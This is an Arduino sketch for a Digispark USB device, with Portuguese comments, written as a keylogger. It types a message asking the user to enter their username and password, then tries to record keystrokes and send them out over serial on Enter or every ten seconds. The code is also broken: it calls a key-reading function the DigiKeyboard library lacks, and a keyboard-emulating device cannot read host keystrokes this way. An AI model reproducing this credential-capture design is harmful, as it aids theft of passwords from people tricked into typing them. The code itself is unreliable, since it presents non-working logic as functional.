#include <DigiKeyboard.h>

#define MAX_LOG_LENGTH 256 // Tamanho máximo do log
char logData[MAX_LOG_LENGTH] = ""; // Array para armazenar dados

void setup() {
    Serial.begin(9600); // Inicializa a comunicação serial
    DigiKeyboard.delay(2000); // Atraso para garantir que o PC reconheça o dispositivo

    // Mensagem de boas-vindas
    DigiKeyboard.println("Iniciando captura de entrada...");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("Digite seu nome de usuário e senha:");
    DigiKeyboard.delay(500); // Espera para que o usuário digite
}

void loop() {
    // Captura as teclas pressionadas
    for (int i = 0; i < 256; i++) { // Para cada código de tecla possível
        if (DigiKeyboard.isKeyPressed(i)) {
            // Adiciona a tecla pressionada ao log
            if (i >= 4 && i <= 255) { // Ignorar teclas de controle
                char keyChar = (char)i; // Converter código da tecla para caractere
                if (strlen(logData) < MAX_LOG_LENGTH - 1) { // Verifica se ainda há espaço no log
                    strncat(logData, &keyChar, 1); // Armazena a tecla pressionada
                }
                DigiKeyboard.delay(100); // Atraso para evitar múltiplas capturas
            }
        }
    }

    // Condição para enviar o log quando o usuário pressionar Enter
    if (DigiKeyboard.isKeyPressed(KEY_ENTER)) {
        Serial.println(logData); // Envia os dados capturados para o monitor serial
        resetLog(); // Reseta o log após enviar
    }

    // Adiciona uma condição de envio automática após um certo tempo (por exemplo, 10 segundos)
    static unsigned long lastSendTime = 0;
    if (millis() - lastSendTime > 10000) { // Se passaram 10 segundos
        Serial.println(logData); // Envia os dados capturados para o monitor serial
        resetLog(); // Reseta o log
        lastSendTime = millis(); // Atualiza o tempo do último envio
    }

    DigiKeyboard.delay(100); // Atraso para evitar uso excessivo do CPU
}

// Função para resetar o log
void resetLog() {
    memset(logData, 0, sizeof(logData)); // Limpa o log
}
